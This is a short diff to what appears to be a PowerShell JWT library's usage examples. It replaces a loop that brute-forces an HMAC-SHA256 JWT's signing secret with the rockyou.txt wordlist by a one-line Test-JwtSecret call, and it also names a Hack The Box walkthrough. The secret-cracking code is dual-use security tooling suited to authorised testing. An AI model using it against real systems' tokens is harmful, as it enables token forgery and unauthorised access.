@@ -198,25 +198,9 @@ $jwkUri = "http://myserver/jwkcollection/jwks.json"
 $newJwt = New-JsonWebToken -Claims $payload -HashAlgorithm SHA256 -SigningCertificate $cert -JwkUri $jwkUri -TimeToLive 300
 
 
-# Brute force an HMAC-SHA256 JWT
+#  Brute force an HMAC-SHA256 JWT in an attempt to obtain the secret used to sign it
 $jwt = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2MDYxNDEwOTMsIm5iZiI6MTYwNjE0MTA5MywiZXhwIjoxNjA2MTQxMzkzLCJqdGkiOiI1Njk5YTBlYTk3YzM0Yzc2OTlkZGZlNzNmNTIzOTI1MiIsInN1YiI6InVzZXJuYW1lQGNvbXBhbnkuY29tIn0.Ej86QALzH37R1zB7QhwwYdFjXL1UhG2E3n6nezEYONY"
-
-$wordListFilePath = "./rockyou.txt"
-$wordList = [System.IO.File]::ReadAllLines($wordListFilePath)
-
-foreach ($secret in $wordList)
-{
-    if ($secret.Trim().Length -ge 1)
-    {
-        [bool]$cracked = Test-JwtSignature -JsonWebToken $jwt -Key $secret.Trim() -HashAlgorithm SHA256
-        if ($cracked)
-        {
-            $outputMessage = "Secret was: {0}" -f $secret
-            Write-Host -Object $outputMessage -ForegroundColor Green
-            break
-        }
-    }
-}
+$jwt | Test-JwtSecret -WordListFilePath "./rockyou.txt"
 
 
 # Hack The Box "Under Construction" walkthrough (algorithm substitution and SQL injection)
